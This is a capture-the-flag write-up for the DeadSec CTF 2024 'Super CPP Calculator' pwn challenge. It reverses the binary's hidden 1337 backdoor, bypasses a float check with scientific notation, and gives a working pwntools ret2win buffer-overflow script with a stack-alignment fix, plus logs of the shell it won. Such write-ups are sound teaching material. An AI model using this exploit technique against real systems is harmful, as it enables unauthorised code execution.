---
title: DeadSec CTF 2024 - Super CPP Calculator
description: Writeup for Super CPP Calculator pwn challenge
date: 2024-07-27
tldr: Do calculations pwn and ret2win.
draft: false
tags: ["ctf", "writeup", "pwn"]
---

# DeadSec CTF 2024 - Super CPP Calculator

We get binary that let's us perform some calculations

```bash
./test
Best Calculator

1. Float Calculator
2. Integer Calculator
> 1
Floater Calculator
> 5.0
> 1.0
Best Calculator

1. Float Calculator
2. Integer Calculator
>
```

we start reversing the binary to understand more about what happening there


```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3[28]; // [rsp+0h] [rbp-20h] BYREF
  int v4; // [rsp+1Ch] [rbp-4h] BYREF

  v4 = 0;
  Calculator::Calculator((Calculator *)v3);
  setup();
  while ( 1 )
  {
    while ( 1 )
    {
      banner();
      printf("> ");
      __isoc99_scanf("%d", &v4);
      if ( v4 != 1337 )
        break;
      Calculator::Backdoor((Calculator *)v3);
    }
    if ( v4 <= 1337 )
    {
      if ( v4 == 1 )
      {
        Calculator::setnumber_floater((Calculator *)v3);
      }
      else if ( v4 == 2 )
      {
        Calculator::setnumber_integer((Calculator *)v3);
      }
    }
  }
}
```

seems like entering `1337` triggers some kind of hidden behaviour

```c
ssize_t __fastcall Calculator::Backdoor(Calculator *this)
{
  ssize_t result; // rax
  __int64 buf[128]; // [rsp+10h] [rbp-400h] BYREF

  memset(buf, 0, sizeof(buf));
  result = *((unsigned int *)this + 6);
  if ( (_DWORD)result )
  {
    puts("Create note");
    printf("> ");
    return read(0, buf, *((int *)this + 6));
  }
  return result;
}
```

we notice a vulnerable `read`, but the size of the `read` is controlled by result of previous regular calculator operation - meaning we need to produce a result big enough to be at least as big as our payload.

the integer part seems to be implemented well 

```c
Calculator *__fastcall Calculator::setnumber_integer(Calculator *this)
{
  Calculator *result; // rax

  puts("Integer Calculator");
  printf("> ");
  __isoc99_scanf("%d", this);
  printf("> ");
  __isoc99_scanf("%d", (char *)this + 4);
  if ( *(int *)this < 0 || *((int *)this + 1) < 0 || *(int *)this > 10 || *((int *)this + 1) > 10 )
  {
    printf("No Hack");
    exit(1);
  }
  *((_DWORD *)this + 2) = *((_DWORD *)this + 1) + *(_DWORD *)this;
  result = this;
  *((_DWORD *)this + 6) = *((_DWORD *)this + 2);
  return result;
}
```

but the floating has some odd logic in it

```c
__int64 __fastcall Calculator::setnumber_floater(Calculator *this)
{
  __int64 result; // rax

  puts("Floater Calculator");
  printf("> ");
  __isoc99_scanf("%f", (char *)this + 12);
  printf("> ");
  __isoc99_scanf("%f", (char *)this + 16);
  if ( *((float *)this + 3) < 0.0
    || *((float *)this + 4) < 0.0
    || *((float *)this + 3) > 10.0
    || *((float *)this + 4) > 10.0 )
  {
    printf("No Hack");
    exit(1);
  }
  if ( (unsigned __int8)checkDecimalPlaces(*((float *)this + 3)) != 1 )
  {
    *((_DWORD *)this + 3) = 1065353216;
    *((_DWORD *)this + 4) = 1065353216;
  }
  *((float *)this + 5) = *((float *)this + 3) / *((float *)this + 4);
  *((_DWORD *)this + 6) = (int)*((float *)this + 5);
  result = *((unsigned int *)this + 6);
  if ( (int)result < 0 )
  {
    result = (__int64)this;
    --*((_DWORD *)this + 6);
  }
  return result;
}
```

if only we could get around the check of decimal places to do something like 1.0/0.00001

```c
__int64 __fastcall checkDecimalPlaces(float a1)
{
  unsigned int v1; // ebx
  char v3[32]; // [rsp+10h] [rbp-1D0h] BYREF
  char v4[32]; // [rsp+30h] [rbp-1B0h] BYREF
  char v5[376]; // [rsp+50h] [rbp-190h] BYREF
  __int64 v6; // [rsp+1C8h] [rbp-18h]

  std::ostringstream::basic_ostringstream();
  std::ostream::operator<<(v5, *(double *)_mm_cvtsi32_si128(LODWORD(a1)).m128i_i64);
  std::ostringstream::str(v4, v5);
  v6 = std::string::find(v4, 46LL, 0LL);
  if ( v6 == -1 )
  {
    v1 = 1;
  }
  else
  {
    std::string::substr(v3, v4, v6 + 1, -1LL);
    LOBYTE(v1) = (unsigned __int64)std::string::length(v3) <= 1;
    std::string::~string(v3);
  }
  std::string::~string(v4);
  std::ostringstream::~ostringstream(v5);
  return v1;
}
```

this check is looking for presence of the decimal place delimiter, but we can maybe cheat our way around by using scientific notation `1e-5` 

we start writing a solve script which seems to work ok except for the fact that the app crashes on call to system 


## Executing the win function

```bash
python solve.py
[*] '/home/kali/CTF_SATURDAY/super_cpp/test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/usr/bin/valgrind' argv=[b'valgrind', b'--leak-check=full', b'--track-origins=yes', b'./test'] : pid 88244
[DEBUG] Received 0xe8 bytes:
    b'==88244== Memcheck, a memory error detector\n'
    b"==88244== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.\n"
    b'==88244== Using Valgrind-3.20.0 and LibVEX; rerun with -h for copyright info\n'
    b'==88244== Command: ./test\n'
    b'==88244== \n'
[DEBUG] Received 0x3b bytes:
    b'Best Calculator\n'
    b'\n'
    b'1. Float Calculator\n'
    b'2. Integer Calculator\n'
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x15 bytes:
    b'Floater Calculator\n'
    b'> '
[DEBUG] Sent 0x4 bytes:
    b'1.0\n'
[DEBUG] Sent 0x7 bytes:
    b'1.0e-4\n'
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0x5 bytes:
    b'1337\n'
[DEBUG] Received 0x1ba bytes:
    b'Best Calculator\n'
    b'\n'
    b'1. Float Calculator\n'
    b'2. Integer Calculator\n'
    b'> Create note\n'
    b'> ==88244== Syscall param read(buf) points to unaddressable byte(s)\n'
    b'==88244==    at 0x4BF9A1D: read (read.c:26)\n'
    b'==88244==    by 0x4018E0: Calculator::Backdoor() (in /home/kali/CTF_SATURDAY/super_cpp/test)\n'
    b'==88244==    by 0x401982: main (in /home/kali/CTF_SATURDAY/super_cpp/test)\n'
    b"==88244==  Address 0x1fff001000 is not stack'd, malloc'd or (recently) free'd\n"
    b'==88244== \n'
_Z3winv : 4200256
_Unwind_Resume : 4199012
plt._Unwind_Resume : 4199012
got._Unwind_Resume : 4210848
Offset: 1024
Win function address: 0x401740
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x17@\x00\x00\x00\x00\x00@\x17@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x411 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  40 17 40 00  00 00 00 00  40 17 40 00  00 00 00 00  │@·@·│····│@·@·│····│
    00000410  0a                                                  │·│
    00000411
[*] Switching to interactive mode
Create note
> ==88244== Syscall param read(buf) points to unaddressable byte(s)
==88244==    at 0x4BF9A1D: read (read.c:26)
==88244==    by 0x4018E0: Calculator::Backdoor() (in /home/kali/CTF_SATURDAY/super_cpp/test)
==88244==    by 0x401982: main (in /home/kali/CTF_SATURDAY/super_cpp/test)
==88244==  Address 0x1fff001000 is not stack'd, malloc'd or (recently) free'd
==88244==
[DEBUG] Received 0x62 bytes:
    b'==88244== \n'
    b'==88244== Process terminating with default action of signal 11 (SIGSEGV): dumping core\n'
==88244==
==88244== Process terminating with default action of signal 11 (SIGSEGV): dumping core
[DEBUG] Received 0x130 bytes:
    b'==88244==  General Protection Fault\n'
    b'==88244==    at 0x4B4879B: do_system (system.c:148)\n'
    b'==88244==    by 0x401756: win() (in /home/kali/CTF_SATURDAY/super_cpp/test)\n'
    b'==88244==    by 0x9: ???\n'
    b'==88244==    by 0x3F7FFFFFFFFFFFFF: ???\n'
    b'==88244==    by 0x461C400038D1B716: ???\n'
    b'==88244==    by 0x5390000270F: ???\n'
==88244==  General Protection Fault
==88244==    at 0x4B4879B: do_system (system.c:148)
==88244==    by 0x401756: win() (in /home/kali/CTF_SATURDAY/super_cpp/test)
==88244==    by 0x9: ???
==88244==    by 0x3F7FFFFFFFFFFFFF: ???
==88244==    by 0x461C400038D1B716: ???
==88244==    by 0x5390000270F: ???
[DEBUG] Received 0xad bytes:
    b'==88244== \n'
    b'==88244== HEAP SUMMARY:\n'
    b'==88244==     in use at exit: 73,728 bytes in 1 blocks\n'
    b'==88244==   total heap usage: 1 allocs, 0 frees, 73,728 bytes allocated\n'
    b'==88244== \n'
==88244==
==88244== HEAP SUMMARY:
==88244==     in use at exit: 73,728 bytes in 1 blocks
==88244==   total heap usage: 1 allocs, 0 frees, 73,728 bytes allocated
==88244==
[DEBUG] Received 0x24b bytes:
    b'==88244== LEAK SUMMARY:\n'
    b'==88244==    definitely lost: 0 bytes in 0 blocks\n'
    b'==88244==    indirectly lost: 0 bytes in 0 blocks\n'
    b'==88244==      possibly lost: 0 bytes in 0 blocks\n'
    b'==88244==    still reachable: 73,728 bytes in 1 blocks\n'
    b'==88244==         suppressed: 0 bytes in 0 blocks\n'
    b'==88244== Reachable blocks (those to which a pointer was found) are not shown.\n'
    b'==88244== To see them, rerun with: --leak-check=full --show-leak-kinds=all\n'
    b'==88244== \n'
    b'==88244== For lists of detected and suppressed errors, rerun with: -s\n'
    b'==88244== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)\n'
==88244== LEAK SUMMARY:
==88244==    definitely lost: 0 bytes in 0 blocks
==88244==    indirectly lost: 0 bytes in 0 blocks
==88244==      possibly lost: 0 bytes in 0 blocks
==88244==    still reachable: 73,728 bytes in 1 blocks
==88244==         suppressed: 0 bytes in 0 blocks
==88244== Reachable blocks (those to which a pointer was found) are not shown.
==88244== To see them, rerun with: --leak-check=full --show-leak-kinds=all
==88244==
==88244== For lists of detected and suppressed errors, rerun with: -s
==88244== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)
[*] Got EOF while reading in interactive
```

most likely we are having problems with stack aligment this exploit works but segfaults on `movaps` instruction when executing the `libc` `system`

https://ropemporium.com/guide.html

> The MOVAPS issue. If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

so lets just skip this initial push to `ebp` by adding 8 to the adress skipping some initial instructions of the win function

```python
from pwn import *

# Set up the context
context.binary = './test'
context.log_level = 'debug'

# Load the binary for local analysis
elf = ELF('./test')

# Connect to the remote service
p = remote('34.66.114.153', 32035)
# p = process(['valgrind', '--leak-check=full', '--track-origins=yes', './test'])
# Interact with the initial menu to get to the setnumber_floater function
p.recvuntil(b"> ")
p.sendline(b"1")  # Select Float Calculator
p.recvuntil(b"Floater Calculator")
p.sendline(b"1.0")  # First float number
p.recvuntil(b"> ")
# go reverse the float function and see how it check for decimal places
# you can get around that check by combining normal dot notation with scientific notation
# https://cplusplus.com/reference/cstdio/scanf/
p.sendline(b"1.0e-4")  # Second float number

# Verify if result is correctly set to a large value
result = 100  # We expect this value for the division of 10.0 by 0.1

# Continue to the vulnerable read
p.recvuntil(b"> ")
# there is a backdoor function triggered by entering 1337 with a vulnerable read() but the maximum payload size(size_t in the read)
# is limited by the result of the previous results of the math operation which is kept low on purpose bye some checks in them 
# we need 1024 + 8 + 8 and the biggest we can do while complying with the restrictions is 100 by doing 10.0/0.1 
p.sendline(b"1337")  # Trigger Backdoor
p.recvuntil(b"> ")

# Calculate the offset considering the buffer size of 128 * 8 bytes
buffer_size = 128 * 8  + 8 # 1024 bytes
offset = buffer_size   # Additional space for saved registers (rbp)

# Print all symbols to verify the win function address
for k, v in elf.symbols.items():
    if "win" in k:
        print(f"{k} : {v}")

# Find the address of the win function (update this with the actual mangled name)
win_function = elf.symbols['_Z3winv']  # This is a likely mangled name; adjust if needed

print(f"Offset: {offset}")

print(f"Win function address: {hex(win_function)}")

# Craft the payload
payload = b'A' * offset
# suffer trough some gdb valgrind magic
# why +8? go see the assembly for the file and see
# https://ondrysak.github.io/posts/ret2win/
payload += p64(win_function + 8)
print(payload)

# Send the payload
p.sendline(payload)

# Interact with the shell if needed
p.interactive()
```

we get a shell and we just `cat flag.txt` to get the flag.

```bash
[DEBUG] Sent 0x411 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  41 41 41 41  41 41 41 41  48 17 40 00  00 00 00 00  │AAAA│AAAA│H·@·│····│
    00000410  0a                                                  │·│
    00000411
[*] Switching to interactive mode
[DEBUG] Received 0xe bytes:
    b'Create note\n'
    b'> '
Create note
> $ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x63 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag.txt\n'
    b'home\n'
    b'lib\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'test\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
test
tmp
usr
var
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x15 bytes:
    b'DEAD{so_ez_pwn_hehe}\n'
DEAD{so_ez_pwn_hehe}
```